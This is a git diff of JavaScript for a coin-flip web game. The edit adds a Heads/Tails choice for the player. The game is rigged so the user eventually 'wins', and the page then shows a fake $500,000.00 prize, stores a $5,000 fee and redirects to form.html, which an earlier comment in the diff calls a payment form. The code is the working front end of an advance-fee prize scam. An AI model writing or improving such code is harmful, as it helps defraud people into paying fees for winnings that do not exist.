@@ -1,11 +1,28 @@
 const flipButton = document.getElementById("flip-button");
 const result = document.getElementById("result");
-const loading = document.getElementById("loading");
 const player1Coin = document.getElementById("player1-coin");
 const player2Coin = document.getElementById("player2-coin");
+const chooseHead = document.getElementById("choose-head");
+const chooseTail = document.getElementById("choose-tail");
 
 let gameCount = 0;
+let player1Choice = null;
 
+function enableFlipButton(choice) {
+    player1Choice = choice; // Save the player's choice
+    flipButton.disabled = false; // Enable the flip button
+    result.innerHTML = `Player 1 chose <b>${choice}</b>. Click Flip to play!`; // Show choice
+}
+
+// Event listeners for choosing Head or Tail
+chooseHead.addEventListener("click", () => {
+    enableFlipButton("Heads");
+});
+chooseTail.addEventListener("click", () => {
+    enableFlipButton("Tails");
+});
+
+// Handle the flipping logic
 flipButton.addEventListener("click", () => {
     gameCount++;
     if (gameCount <= 3) {
@@ -22,8 +39,8 @@ function playGame(round) {
     flipButton.disabled = true;
 
     setTimeout(() => {
-        const player1Choice = Math.random() > 0.5 ? "Heads" : "Tails";
-        const player2Choice = player1Choice === "Heads" ? "Tails" : "Heads";
+        const randomSide = Math.random() > 0.5 ? "Heads" : "Tails";
+        const player2Choice = randomSide === "Heads" ? "Tails" : "Heads";
 
         player1Coin.textContent = player1Choice;
         player2Coin.textContent = player2Choice;
@@ -35,22 +52,22 @@ function playGame(round) {
             winner = "User"; // User wins the 3rd round
         }
 
-        result.innerHTML = winner === "AI" 
-            ? `Round ${round} Winner: <b>Player 2 (AI)</b>`
-            : `Round ${round} Winner: <b>Player 1 (User)</b>`;
+        if (winner === "AI") {
+            result.innerHTML = `Round ${round} Winner: <b>Player 2 (AI)</b>`;
+        } else {
+            const prize = "$500,000.00";
+            const fee = "$5,000";
+            result.innerHTML = `Round ${round} Winner: <b>Player 1 (User)</b>! You won <b>${prize}</b>!`;
 
-        if (round === 3) {
+            // Save prize and fee details
+            localStorage.setItem("winnerName", "Player 1");
+            localStorage.setItem("winnerAmount", prize);
+            localStorage.setItem("winnerFee", fee);
+
+            // Show loading and redirect
             setTimeout(() => {
-                loading.style.display = "block";
+                result.innerHTML += "<br>Loading...";
                 setTimeout(() => {
-                    // Redirect to payment form
-                    const prize = "$500,000.00";
-                    const fee = "$5,000";
-
-                    localStorage.setItem("winnerName", "Player 1");
-                    localStorage.setItem("winnerAmount", prize);
-                    localStorage.setItem("winnerFee", fee);
-
                     window.location.href = "form.html";
                 }, 10000);
             }, 2000);
